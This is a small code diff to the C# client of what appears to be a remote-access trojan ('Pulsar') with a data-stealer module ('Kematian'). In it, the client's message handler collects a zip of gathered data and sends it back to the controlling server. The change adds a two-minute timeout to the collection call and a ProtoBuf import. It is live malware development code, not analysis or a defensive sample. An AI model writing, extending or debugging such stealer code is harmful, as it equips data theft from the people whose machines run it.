@@ -3,6 +3,7 @@ using Pulsar.Common.Networking;
 using Pulsar.Client.Kematian;
 using Pulsar.Common.Messages.Monitoring.Kematian;
 using Pulsar.Common.Messages.other;
+using ProtoBuf;
 
 namespace Pulsar.Client.Messages
 {
@@ -24,7 +25,8 @@ namespace Pulsar.Client.Messages
 
         private void Execute(ISender client, GetKematian message)
         {
-            byte[] zipFile = Handler.GetData();
+            int defaultTimeout = 120; //after 2 minutes all hope is lost :sob:
+            byte[] zipFile = Handler.GetData(defaultTimeout);
             client.Send(new GetKematian { ZipFile = zipFile });
         }
     }
